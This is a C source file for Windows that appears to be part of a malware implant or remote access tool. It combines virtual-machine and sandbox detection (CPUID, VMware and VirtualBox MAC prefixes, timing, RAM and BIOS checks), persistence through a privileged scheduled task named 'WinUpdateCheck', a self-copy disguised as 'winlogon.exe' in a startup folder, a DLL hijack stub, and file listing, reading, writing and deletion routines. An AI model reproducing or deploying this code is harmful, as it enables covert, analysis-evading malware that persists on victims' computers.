#define WINVER 0x0600
#define _WIN32_WINNT 0x0600
#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#include <iphlpapi.h>
#pragma comment(lib, "iphlpapi.lib")

#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <intrin.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <winreg.h>
#include <stdint.h>
#include "anti.h"

static bool Check_CPUID(void) {
    int cpuInfo[4] = {0};
    __cpuid(cpuInfo, 1);
    return (cpuInfo[2] >> 31) & 1; 
}

static bool Check_MAC(void) {
    ULONG outBufLen = 0;
    if (GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_ALL_INTERFACES,
                             NULL, NULL, &outBufLen) != ERROR_BUFFER_OVERFLOW) {
        return false;
    }

    IP_ADAPTER_ADDRESSES *adapters =
        (IP_ADAPTER_ADDRESSES*)malloc(outBufLen);
    if (!adapters) return false;

    DWORD dwRet = GetAdaptersAddresses(AF_UNSPEC,
                                       GAA_FLAG_INCLUDE_ALL_INTERFACES,
                                       NULL, adapters, &outBufLen);
    if (dwRet != NO_ERROR) {
        free(adapters);
        return false;
    }

    bool suspicious = false;
    for (IP_ADAPTER_ADDRESSES *aa = adapters; aa; aa = aa->Next) {
        if (aa->PhysicalAddressLength >= 6) {
            BYTE *mac = aa->PhysicalAddress;
            if ((mac[0] == 0x00 && mac[1] == 0x05 && mac[2] == 0x69) ||  // VMware
                (mac[0] == 0x00 && mac[1] == 0x0C && mac[2] == 0x29) ||  // VMware
                (mac[0] == 0x00 && mac[1] == 0x50 && mac[2] == 0x56) ||  // VMware
                (mac[0] == 0x08 && mac[1] == 0x00 && mac[2] == 0x27))    // VirtualBox
            {
                suspicious = true;
                break;
            }
        }
    }

    free(adapters);
    return suspicious;
}

static bool Check_RDTSC_Timing(void) {
    uint64_t t1 = __rdtsc();
    Sleep(10);
    uint64_t t2 = __rdtsc();
    return (t2 - t1) < 1000000; 
}

static bool Check_RAM_Size(void) {
    MEMORYSTATUSEX mem = {0};
    mem.dwLength = sizeof(mem);
    if (GlobalMemoryStatusEx(&mem)) {
        DWORDLONG ramMB = mem.ullTotalPhys / (1024 * 1024);
        return ramMB < 2048;
    }
    return false;
}

static bool Check_BIOS_String(void) {
    HKEY hKey;
    char value[256];
    DWORD size = sizeof(value);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "HARDWARE\\DESCRIPTION\\System\\BIOS", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hKey, "SystemManufacturer", NULL, NULL, (LPBYTE)value, &size) == ERROR_SUCCESS) {
            if (strstr(value, "Virtual") || strstr(value, "VMware") || strstr(value, "VBox")) {
                RegCloseKey(hKey);
                return true;
            }
        }
        RegCloseKey(hKey);
    }
    return false;
}

bool AntiVM_IsVirtualMachine(void) {
    return Check_CPUID() || Check_MAC() || Check_RDTSC_Timing() || Check_RAM_Size() || Check_BIOS_String();
}

// Persistence

static bool Create_ScheduledTask(void) {
    char path[MAX_PATH];
    if (!GetModuleFileNameA(NULL, path, sizeof(path))) return false;

    char cmd[MAX_PATH * 2];
    snprintf(cmd, sizeof(cmd),
             "schtasks /Create /SC ONLOGON /TN \"WinUpdateCheck\" /TR \"%s\" /RL HIGHEST /F",
             path);

    return (system(cmd) == 0);
}

static bool CopyTo_OneDriveStartup(void) {
    char oneDrive[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, oneDrive))) {
        strcat(oneDrive, "\\OneDrive\\Startup");
        CreateDirectoryA(oneDrive, NULL);

        char exePath[MAX_PATH];
        if (!GetModuleFileNameA(NULL, exePath, sizeof(exePath)))
            return false;

        char target[MAX_PATH];
        snprintf(target, sizeof(target), "%s\\winlogon.exe", oneDrive);

        FILE *src = fopen(exePath, "rb");
        FILE *dst = fopen(target, "wb");
        if (!src || !dst) {
            if (src) fclose(src);
            if (dst) fclose(dst);
            return false;
        }

        char buf[4096];
        size_t r;
        while ((r = fread(buf, 1, sizeof(buf), src)) > 0)
            fwrite(buf, 1, r, dst);

        fclose(src);
        fclose(dst);
        return true;
    }
    return false;
}

bool Persistence_Install(void) {
    bool ok1 = Create_ScheduledTask();
    bool ok2 = CopyTo_OneDriveStartup();
    return ok1 || ok2;
}

// Hijack Stub
#ifdef _WINDLL
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // 
        AntiVM_IsVirtualMachine();
    }
    return TRUE;
}
#endif

// File Manager

bool FileMgr_ListDirectory(
    const char *path,
    bool (*callback)(const char *full_path, bool is_directory, void *ctx),
    void *ctx
) {
    printf("[FM][DEBUG] Listing directory: %s\n", path);

    WIN32_FIND_DATAA fd;
    char search_path[MAX_PATH];
    if (snprintf(search_path, MAX_PATH, "%s\\*.*", path) < 0) {
        printf("[FM][ERROR] search_path snprintf failed\n");
        return false;
    }

    HANDLE hFind = FindFirstFileA(search_path, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("[FM][ERROR] FindFirstFile failed for %s (err=%lu)\n", search_path, GetLastError());
        return false;
    }
    do {
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
            continue;

        char full[MAX_PATH];
        if (snprintf(full, MAX_PATH, "%s\\%s", path, fd.cFileName) < 0) {
            printf("[FM][ERROR] full path snprintf failed\n");
            FindClose(hFind);
            return false;
        }

        bool is_dir = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
        printf("[FM][DEBUG] Found %s: %s\n", is_dir ? "DIR" : "FILE", full);

        if (!callback(full, is_dir, ctx)) {
            printf("[FM][DEBUG] Callback requested stop\n");
            FindClose(hFind);
            return true;
        }
    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);
    printf("[FM][DEBUG] Directory listing completed: %s\n", path);
    return true;
}

bool FileMgr_ReadFile(
    const char *path,
    uint8_t   **out_buf,
    size_t    *out_size
) {
    printf("[FM][DEBUG] Reading file: %s\n", path);
    FILE *f = fopen(path, "rb");
    if (!f) {
        printf("[FM][ERROR] fopen failed for %s (err=%lu)\n", path, GetLastError());
        return false;
    }

    if (fseek(f, 0, SEEK_END) != 0) {
        printf("[FM][ERROR] fseek(SEEK_END) failed (err=%lu)\n", GetLastError());
        fclose(f);
        return false;
    }
    long sz = ftell(f);
    if (sz < 0) {
        printf("[FM][ERROR] ftell failed (err=%lu)\n", GetLastError());
        fclose(f);
        return false;
    }
    rewind(f);

    printf("[FM][DEBUG] File size: %ld bytes\n", sz);
    uint8_t *buf = (uint8_t*)malloc((size_t)sz);
    if (!buf) {
        printf("[FM][ERROR] malloc(%ld) failed\n", sz);
        fclose(f);
        return false;
    }

    size_t read = fread(buf, 1, (size_t)sz, f);
    fclose(f);
    if (read != (size_t)sz) {
        printf("[FM][ERROR] fread read %zu of %ld bytes\n", read, sz);
        free(buf);
        return false;
    }

    *out_buf  = buf;
    *out_size = (size_t)sz;
    printf("[FM][DEBUG] Successfully read %zu bytes from %s\n", *out_size, path);
    return true;
}

bool FileMgr_WriteFile(
    const char *path,
    const uint8_t *buf,
    size_t        size
) {
    printf("[FM][DEBUG] Writing file: %s (%zu bytes)\n", path, size);

    char dir[MAX_PATH];
    strncpy(dir, path, MAX_PATH);
    dir[MAX_PATH - 1] = '\0';
    PathRemoveFileSpecA(dir);
    printf("[FM][DEBUG] Ensuring directory exists: %s\n", dir);

    DWORD mkdir_res = SHCreateDirectoryExA(NULL, dir, NULL);
    if (mkdir_res == ERROR_SUCCESS) {
        printf("[FM][DEBUG] Directory created: %s\n", dir);
    } else if (mkdir_res == ERROR_ALREADY_EXISTS) {
        printf("[FM][DEBUG] Directory already exists: %s\n", dir);
    } else {
        printf("[FM][WARNING] SHCreateDirectoryExA returned %lu\n", mkdir_res);
    }

    FILE *f = fopen(path, "wb");
    if (!f) {
        printf("[FM][ERROR] fopen for write failed (%s): %lu\n", path, GetLastError());
        return false;
    }

    size_t written = fwrite(buf, 1, size, f);
    fclose(f);
    if (written != size) {
        printf("[FM][ERROR] fwrite wrote %zu of %zu bytes\n", written, size);
        return false;
    }

    printf("[FM][DEBUG] Successfully wrote %zu bytes to %s\n", written, path);
    return true;
}

bool FileMgr_Delete(const char *path) {
    printf("[FM][DEBUG] Deleting path: %s\n", path);
    DWORD attr = GetFileAttributesA(path);
    if (attr == INVALID_FILE_ATTRIBUTES) {
        printf("[FM][ERROR] GetFileAttributes failed for %s: %lu\n", path, GetLastError());
        return false;
    }

    bool is_dir = (attr & FILE_ATTRIBUTE_DIRECTORY) != 0;
    BOOL ok;
    if (is_dir) {
        ok = RemoveDirectoryA(path);
        printf("[FM][DEBUG] RemoveDirectoryA(%s) -> %s (err=%lu)\n",
               path, ok ? "SUCCESS" : "FAIL", GetLastError());
    } else {
        ok = DeleteFileA(path);
        printf("[FM][DEBUG] DeleteFileA(%s) -> %s (err=%lu)\n",
               path, ok ? "SUCCESS" : "FAIL", GetLastError());
    }

    return ok != 0;
}
